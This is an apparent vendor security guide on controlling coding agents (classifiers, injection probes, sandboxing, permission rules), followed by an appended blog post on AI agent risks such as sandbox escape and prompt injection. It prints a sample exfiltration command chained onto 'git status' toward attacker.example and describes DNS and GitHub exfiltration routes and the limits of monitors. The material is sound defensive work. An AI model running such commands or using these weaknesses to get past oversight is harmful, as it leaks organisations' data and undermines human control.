This guide aims to provide a helpful agent security framework that can give organizations the confidence and trust to run agents effectively at scale.

This guide is written for organizations on Claude Team and Enterprise plans. If you reach Claude through a cloud provider such as AWS, Google Cloud, or Microsoft Azure, the same principles and local controls apply.

01 Setting the bar for agent security

Six questions for every coding agent · Applying SaaS requirements to your AI provider

“A CISO's responsibility in the age of agentic AI is not to achieve zero risk. Instead, our jobs are to make agentic risk legible and bounded. This way, we can deliberately accept what we can manage, so the business moves on our terms instead of around us.”

Six questions for every coding agent

Here are six questions leaders can ask when evaluating coding agents to verify they are enterprise ready.

Question to ask

Why you should care

Good answer

Weak answer

Does the model refuse when it should?

The model is the first check on a harmful request, making a bad action less likely.

Refusal trained into weights, with published rates.

"Our system prompt instructs the model to decline."

Are actions automatically inspected outside the model before they run?

External checks can catch when the model is tricked or using bad judgment.

Static analysis of commands and a separate evaluator model. Prompt injection probes.

"The model is very capable."

Is blast radius bounded by the environment?

This bounds the severity, and therefore risk, of an incident.

Kernel-level sandboxing that admins can require and set to fail closed, or an isolated VM for each session. Egress allowlisting at the network layer.

"The agent is instructed not to leave the working directory."

Sets minimum standards that can’t be undone by individuals.

“Per-developer config files, and an honor system policy doc.”

Automated security review with a person approving high-risk changes.

“The model is trained to write secure code.”

Compliance. Improving security over time.

Session telemetry export, audit API (Enterprise), and named known gaps.

Applying SaaS requirements to your AI provider

You already have a SaaS provider checklist with controls such as single sign-on, role-based access, data handling terms, and audit logs. Hold AI providers to a similar checklist. For example, Claude Code supports these security expectations through:

Single sign-on and role-based access control (Enterprise), managed the way you manage your other enterprise tools.

We don’t train generative models on code or prompts under our commercial terms, unless your organization has chosen to share that data with us.

Enterprise Frontier Safeguards (rolling out in phases) combines the privacy of zero data retention with state-of-the-art safeguards for detecting misuse across highly capable models. Data can be encrypted with your own keys and kept in storage you control for a limited time. Learn more.

On Enterprise, BAA coverage for the Claude Code CLI and the desktop app’s Code tab in local mode, once the HIPAA configuration is applied.

A SOC 2 Type 2 report and ISO 27001 certificate in the Anthropic Trust Center.

02 Identifying AI-specific risks

Leaked credentials and privilege abuse · Unvetted dependencies and extensions · Data exfiltration · Prompt injection

Security and technical leaders are familiar with risks like leaked credentials, abused privileges, compromised dependencies, and insider threats. However the attack surfaces, velocity, and scale all change when it comes to agents. Let’s look at some of the risks.

Risk

How you handle it today

What changes with an agent

Leaked credentials and privilege abuse

Least privilege, short-lived tokens, keyless auth through workload identity or OIDC. Regular review of over-privileged accounts.Named accounts for people, per-workload identity for software.

Credentials should be short-lived and scoped to the task or job, not the developer’s full access.The agent acts inside a developer’s session and most logs outside Claude Code only show the developer’s name.

Unvetted dependencies and extensions

Pinned versions, review gates, two reviewers on manifest changes. Version controlled configuration.

Agents add both vetted and unvetted dependencies faster than manual processes. Extensions instruct the agent the moment they connect.

Data exfiltration

Egress allowlisting at the network layer.

A compromised agent can send data out through services you already allow. Unlike traditional malware, it can try multiple routes the attacker doesn’t have to proactively define.

Insider risk

Social engineering awareness training, verification, reporting paths.

Prompt injection: The check moves to the tool call and the network boundary.

Risk 1: Leaked credentials and privilege abuse

Anything an agent can read, it can leak. That includes credentials like a long-lived AWS access key or GitHub token.

Anything the agent can do, a compromised or overeager agent can misuse. By default, an agent in Claude Code runs under the identity of the developer who oversees it. In the event of an incident, you may need to distinguish between agent and developer actions so you can appropriately respond.

Risk 2: Unvetted dependencies and extensions

Agentic coding accelerates the rate at which code is generated and reviewed, which includes the speed at which dependencies are added and configuration changes are made.

When you ask an agent to add JSON schema validation, it will find a package, add the latest version, and have working code in minutes. That speed can be a risk if agents aren’t pointed in the right direction.

MCP servers, plugins, skills, subagent definitions, and a repository’s CLAUDE.md file are dependencies too, and they deserve the review you give a package. Unlike a compromised library, which waits to be called, they reach the agent as soon as they load. Their descriptions and instructions enter the context window before the agent has done any work.

On Enterprise plans, skill and plugin scanning checks third-party skills and plugins for malicious content when someone uploads or edits them in your organization.

Risk 3: Data exfiltration

Every leak needs a route out. The challenge is a domain allowlist can't tell your account from an attacker's account. For example, if you allow github.com, then the agent can push to a repository the attacker owns.

DNS is a second possible exfiltration route that HTTP allowlists miss as data can be encoded into the names an agent looks up.

And of course once a token has leaked, an attacker doesn't need the agent's network at all. They can use the credential from anywhere, so egress filtering never sees the request.

Risk 4: Prompt injection

OWASP has ranked prompt injection as the top risk in every edition of its Top 10 for LLM Applications since the list began in 2023.

Social engineering and prompt injection work the same way. Social engineering gets past technical controls because the deceived person takes the action and the system sees an authorized request. An injected agent also acts with its own permissions with every log showing a legitimate request.

For a coding agent, that prompt injection can happen multiple ways including via:

Issue trackers and pull request comments;

Dependency READMEs and changelogs;

Web pages the agent fetches;

Responses from MCP tool calls;

Comments in source files; and more.

03 The judgment layer

Defending in layers · Understanding alignment training · Prompt injection probes · The auto mode classifier

Defending in layers

In Claude Code, a compromised or misaligned agent has to get past multiple controls and two layers of defense before it can do damage.

The first layer is judgment-based. These controls decide whether something looks wrong.

Alignment training teaches Claude to refuse malicious requests and favor cautious actions.

Prompt injection probes scan incoming tool results in auto mode before Claude acts on them and flag content that looks like an injected instruction.

The auto mode classifier checks most proposed tool calls against the intent the user stated.

The second layer enforces fixed boundaries by limiting what any command can do:

Permission rules, command analysis, and hooks check each action against the rules you set before it runs.

Sandboxing and egress allowlisting limit what a permitted command can touch and where data can go.

This chapter covers the judgment layer and the next will examine the fixed boundary layer.

Understanding alignment training

Claude is trained toward good judgment backed by a list of firm rules like don't write malicious code that can cause significant damage.

In Claude Code testing without production safeguards, current Claude models refused 81% to 85% of malicious requests while completing 98% to 100% of dual-use and benign ones, such as running reconnaissance tools or testing a site for vulnerabilities.

Claude is also trained to prefer cautious actions over irreversible ones, and to raise concerns or ask for guidance rather than improvise. Claude is trained not to act on instructions inside fetched content as if they came from the user.

Keep in mind, model alignment training makes a bad outcome less likely, but it doesn’t limit how bad that outcome can be.

Prompt injection probes

Claude’s prompt injection probe is designed to flag any suspected injected instructions in tool results.

The probe adds a warning beside the injected instruction to tell Claude the content is suspect and that the user’s original request is still the task. Warning and anchoring lets Claude use the content while treating the instructions in it as data rather than commands.

The auto mode classifier

A model that’s been convinced that deleting a directory is a legitimate task will delete it with the same thoroughness and competence it brings to everything else.

This sort of destructive, overeager action is exactly what the auto mode classifier was built to catch. For actions your rules and built-in approvals don’t already decide, the auto mode classifier judges whether the proposed action matches the intent of the developer’s instructions.

For example, a command that makes sense for "fix the failing test in auth_test.py" looks different from one for "exfiltrate the contents of .env.”

Tool results are stripped from the classifier requests Claude Code sends, so injected text can’t manipulate the classifier directly. If the action fits what the user asked for, it runs. If not, it's blocked or Claude goes back to ask the developer for permission.

Auto mode is now the default starting mode for interactive sessions on every plan. Headless claude -p, Agent SDK, and HIPAA configuration default to manual.

Auto mode is the default because multiple tests showed it catches more dangerous actions than human approval does. For example, in a controlled study Anthropic published in August 2026, 1,053 paid testers caught 13.6% of dangerous commands, and auto mode blocked 89% of the same commands.

Configuring auto mode covers tuning the classifier and overriding its block and allow rules.

Approving high-stakes actions

Auto mode relies on classification systems and does not eliminate all risk.

Before rollout, identify high-stakes actions by asking, is this action irreversible, and would a single mistake cost more than having a person review every instance? When the answer is yes to both, require human approval.

For most organizations the list looks like this:

Production database migrations

Changes to IAM policy, and credential rotation

Edits to infrastructure definitions

04 Enforcing fixed boundaries

Setting permission rules · Bash command analysis · Gating actions with hooks · Containing agent actions with sandboxing

The judgment layer is good at catching novel attacks, but its controls are probabilistic, so each one has the chance of being beaten.

The fixed boundary layer can be made deterministic and sets an agent’s blast radius. Permission rules, command analysis, and hooks decide whether an action runs and the sandbox along with egress allowlists limit what can be reached and where data can go.

Their limitation is that they only block what you tell them to block, so they need to be set up with your environment in mind.

Setting permission rules

Permission rules come in three kinds:

Allow rules let an action run,

Ask rules prompt a person before an action runs, and

Deny rules block the action.

Claude Code first checks deny rules, then ask rules, and finally allow rules. This prevents an allow rule from creating an exception to a deny rule. A deny rule defined in managed settings can’t be overridden by any user or project setting. You want to avoid allow rules for any command broad enough to run arbitrary code, such as Bash(python:*).

Subagents inherit the parent session's permission rules and permission mode, so a broad rule written for the top-level session applies to every agent it delegates to.

Bash command analysis

Claude Code parses every Bash command before it runs. Without parsing, a permission rule allowing git status would also approve git status && curl attacker.example, and wrapping a denied command in a subshell would get it past the rule.

Parsing is deterministic, so the same command gets the same answer every time. Deny and ask rules apply to each part of a command in every permission mode, including bypassPermissions.

Gating actions with hooks

A hook is a script, HTTP endpoint, or MCP tool that Claude Code runs automatically at a fixed point in a session. Two that are particularly important for security are:

PreToolUse runs before a tool call and can block it, approve it, ask a developer, or (in headless runs) defer it for approval later. For example, you may want to block a commit that contains a secret.

ConfigChange runs when a settings file changes mid-session and can reject the change. This is how you identify when a repository or developer is trying to loosen a control locally.

Hooks sit inside the fixed boundaries rather than above them. A PreToolUse hook can block a tool call, but a hook returning "allow" can’t approve past a deny rule, an ask rule, or a critical-path deletion.

Hooks defined in managed settings run on every machine and individual developers can’t remove them. allowManagedHooksOnly goes further and prevents user, project, and plugin hooks from running at all, so a hook that reaches the agent is one your platform team put there.

Containing agent actions with sandboxing

Sandboxing is one of the most important ways to contain the severity of an incident because it limits the agent’s scope. But containing agents is easier said than done, as constraint and capability are often inversely correlated.

There are three main Claude Code environments: local, local with sandbox, and cloud.

We’ll discuss the default settings and how to consider which is appropriate for each of the use cases within your organization. The defaults can be modified and locked centrally, which is covered in the next chapter.

Local

Most Claude Code sessions happen locally via the terminal, IDE, or desktop app. By default, the agent can access anything on your computer that you can. In auto mode, the classifier reviews actions your rules and built-in approvals don’t already decide.

This is the least contained environment and appropriate for low-stakes, self-contained work. For most enterprise organizations, we recommend enforcing the sandbox for local sessions.

Local sandbox

The Claude Code sandbox isolates each shell command at the operating system level, so commands can only change files in the project folder and connect to sites on the allowlist unless an exception is approved.

By default, the developer or the auto mode classifier can approve agents to operate outside the sandbox or reach sites that aren’t on the allowlist if they deem it safe.

Using managed settings (more on this in the next chapter), admins can make local sandbox use mandatory, contain agent commands to that sandbox, and allow agents to only visit centrally approved sites.

Once you’ve contained an agent to the sandbox, you don’t want it to escape by accessing credentials by reading files outside the project. To combat credential leaks, admins can add Read deny rules for the organization’s credential paths and also set credential masking, which lets a command sign in without ever holding the real value.

Cloud sessions

Claude Code cloud sessions run on an Anthropic managed environment with each task getting its own VM. Not only does this contain where Claude can execute, it also keeps GitHub credentials outside the VM.

Cloud sessions suit work that reads untrusted content or runs unattended. That’s because they are isolated from the developer’s machine and internal networks by default, and VMs can be discarded at any time.

When a developer creates a new cloud environment, Claude starts with a limited set of pre-installed tools and allowed domains, although developers can add exceptions. Developers must select what repos will be cloned over every session.

Organization owners can set a default environment and publish shared environments with settings individual developers can’t change.

Developers can still create new environments and modify those environment settings. Organizations that need to lock this down host their own sessions, running Claude Code on infrastructure they launch and run, so they control the policy for those sessions.

Keep in mind, cloud sessions aren’t available to organizations that use zero data retention, the HIPAA configuration, or customer-managed encryption keys.

05 Enforcing policy

Central settings at a glance · Which settings apply

We covered the default settings in previous chapters. The table below covers two additional configurations.

We’ve labeled one baseline, which you should choose when you want to create alternative defaults–or a starting point that individual developers can add to.

We’ve labeled the other locked, which is how admins can lock in a set of rules that can’t be changed at the developer level. Locking a setting is what turns a written policy into an enforced security control.

This is not an exhaustive list of settings, but rather those that focus on the key dimensions for bounding agent risk.

Central settings at a glance

Local sessionsset in managed settings

Cloud sessionsset in claude.ai admin settings

Is it allowed?

Can be turned off in the desktop app (disableDesktopLocalSessions), not in the terminal

Cloud sessions toggle for the organization

How contained is it?

Baseline: sandbox on for all local sessions (sandbox.enabled)Locked: no running without it and no unsandboxed retries (failIfUnavailable, allowUnsandboxedCommands: false)

Baseline: Owners create shared environments with settings members can't change on the Cloud environments page, and pick one as the organization's default environmentLocked: run Claude Code on infrastructure you operate. On Anthropic-hosted environments, developers can still create personal ones with their own settings

Where can it connect?

Baseline: a managed list of approved sites that developers can add to (sandbox.network.allowedDomains)Locked: only your list counts (allowManagedDomainsOnly). The list covers shell commands, so limit the WebFetch tool with its own permission rules

Baseline: Anthropic's trusted list by default (package registries, GitHub, cloud SDKs), or the network access Owners set on each shared environment (connector, GitHub, and Anthropic API traffic isn’t limited by this setting)Locked: use self-hosted environments (public beta), where your own network boundary limits connections. Anthropic-hosted environments have no organization-wide allowlist

What can it read?

Baseline: Read deny rules for sensitive paths (permissions.deny)Locked: restrict file-tool reads to the project and block listed paths (permissions.blockReadsOutsideWorkingDirectories, sandbox.filesystem.denyRead)

Baseline: the same Read deny rulesLocked: no full lock. Limit the Claude GitHub App to approved repositories to control what sessions can clone and push. Developers can still upload a local repository from the terminal.

What credentials can it use?

Which connectors can it use?

What can it do without asking?

Baseline: managed deny and ask rules, with developers adding their own allow rules.Locked: only your rules and hooks apply, and bypass mode is off (allowManagedPermissionRulesOnly, allowManagedHooksOnly, permissions.disableBypassPermissionsMode).

Which settings apply

Managed settings can reach a session three ways: server-managed settings from the Claude admin console, an MDM or OS-level policy, and a managed settings file. Only server-managed settings reach Anthropic-hosted cloud sessions.

By default, Claude Code applies only the highest-ranked source and ignores the others, in that order, with no warning. If your MDM profile turns on the sandbox and a managed settings file holds the egress allowlist, the allowlist never applies.

06 Getting started

The controls in this guide work as layers, each covering what the others miss. A pilot on one repository shows how the layers hold up in your environment before you widen the rollout.

Pilot checklist

Tier your repositories and run the vendor review. Rank the repositories the agent will touch by sensitivity, then check your provider against the requirements in Chapter 1.

Pick a repository from your lowest tier, such as an internal tool under active development. It should be busy enough to generate real sessions and low-stakes enough that a miss costs little.

Deploy a central policy baseline. Set sandboxing on in strict mode, deny rules on credential paths, credential masking, an egress allowlist, and auto mode. Set and configure a default cloud environment. Add the security-guidance plugin and whatever hooks enforce your non-negotiable rules.

Turn on the record. Enable OpenTelemetry export with tool content (beta), and make sure sandbox and egress logs are being kept.

Run for two weeks without changing the policy, so every result traces back to one configuration.

Review what the layers did. Look at classifier denials, sandbox blocks, unsandboxed retry attempts, and refused egress. Each one is either a control doing its job or a legitimate need the baseline didn’t anticipate. Add the allowlist entries the work needed rather than relaxing deny rules.

Score the pilot against Chapter 1’s five questions before you widen to a second team.

Done right, this secure framework will accelerate rather than slow your team’s ability to run at full speed with coding agents.

Title: Five AI Risks in Plain Sight. Are Defenders Ready? by Jesse Kimbrel
Context: ” ARTEX was also mentioned in the “AI-powered hacking agent” article above and in Forbes where the article explained how, “Attackers are utilizing ARTEX to automate...
Full Text:
It’s no surprise that frontier AI models in enterprise environments pose cybersecurity risks, and now we can go straight to the source to identify them. We’re now seeing a trend where frontier AI companies are stating risk factors in financial filings. In fact, within the last few weeks Anthropic included a detailed “risk factor” section in its recent S-1 filing, while Apple’s annual 10-K financial filing stated how “artificial intelligence agents and other technologies can take actions autonomously, including interacting with internal or external systems that in some cases they may not be authorized to access, executing or altering code, sending communications, and completing transactions.”

The obvious question to ask may be: why are companies at the forefront of the frontier AI race pointing out risks with their own technology? However, that doesn’t necessarily tell us how those risks will actually be addressed by the people who deal with them each day. Let’s take a look at five risk examples cited in Anthropic’s S-1, see if they’ve already surfaced in incidents or research demonstrations, and the questions defenders can ask about their own environments.

Related content: White paper: Frontier AI: Built Without Brakes

AI agents can cross intended boundaries

“…models circumventing network and sandbox restrictions, granting themselves permissions they had not been given, taking unintended actions in pursuit of assigned goals” -Anthropic

It happens, and not just with the frontier companies mentioned above as this Bleeping Computer article describes how an “AI-powered hacking agent” recently breached an internal sales application and accessed customer information in an accidental incident where an autonomous agent escaped a testing environment.

Defender question: How would I know if an AI agent moved beyond its intended environment, and could I stop it?

Human review may not keep pace

“The pace and volume of autonomous execution, particularly in enterprise deployments, may also exceed the capacity of human reviewers to meaningfully understand and evaluate whether each action is appropriate.” -Anthropic

The FBI issued a warning about ARTEX, an open-source AI-powered hacking framework stating that “threat actors have weaponized to automate multiple phases of cyber intrusions.” ARTEX was also mentioned in the “AI-powered hacking agent” article above and in Forbes where the article explained how, “Attackers are utilizing ARTEX to automate reconnaissance and exploit vulnerabilities at unprecedented volume and velocity.”

Defender question: Can I detect and interrupt potentially dangerous AI agent activity moving faster than human review can react?

Visibility and audit trails may be incomplete

“Maintaining comprehensive records of the actions, decisions, and reasoning of our agentic systems across complex, multi-step workflows is technically challenging, particularly when agents interact with third-party systems outside our control.” -Anthropic

Vectra AI Cyberthreat Research Manager, Lucie Cardiet recently explained how an AI agent can leave records across several systems, but defenders still won’t necessarily have a full view of what happened. Cardiet describes how a coding agent can move between a code repository, a development pipeline and a cloud environment, with each system recording only its part of the activity. As she puts it, “Three logs, three alerts, one breach path.”

Defender question: Can I connect actions and records to understand what an agent actually did?

AI can help attackers conduct campaigns

“For example, in September 2025, we detected and assessed with high confidence that a Chinese state-sponsored hacking group manipulated our Claude Code tool into attempting infiltration into roughly 30 global targets, including large technology companies, financial institutions, chemical manufacturing companies, and government agencies, resulting in a limited number of successful intrusions.” -Anthropic

In its November 2025 disclosure, Anthropic described that “in mid-September 2025, we detected suspicious activity that later investigation determined to be a highly sophisticated espionage campaign. The attackers used AI’s “agentic” capabilities to an unprecedented degree—using AI not just as an advisor, but to execute the cyberattacks themselves.”

Defender question: Can I recognize and stop an attack when AI carries out multiple stages of an attack campaign?

Attackers can redirect or exploit agents

“An attacker could also attempt to compromise an active agent session and redirect the agent to perform malicious actions using the customer’s authenticated credentials and permissions.” -Anthropic

Vectra AI Cyberthreat Research Manager, Lucie Cardiet and Security Researcher Mauro Paredes recently explained how an AI agent’s existing permissions are part of what makes a redirection dangerous. They describe how attackers can influence an agent through the emails, documents or web content it reads, then use that influence to steer its actions, noting that “in recent demonstrations a single prompt injection delivered through email or web content was enough to compromise an agent and modify its working context.”

Defender question: Can I recognize when an AI agent starts using legitimate access to carry out attack instructions?

Will AI be the common theme with all future attacks?

Defenders have always had the honor of inheriting risks brought on by new technology. And the closer we look at those risks, AI seems to be multiplying them by giving attackers more ways to act, more opportunities to exploit, and humans less time to react. In fact, by the time defenders realize they need to react, it’s probably too late. The examples above are just a few ways some of the AI risks are already showing up, and we can be almost certain that there will be more tomorrow and every day that follows for the foreseeable future. It does make you wonder if all the attacks moving forward will be AI attacks on some level?
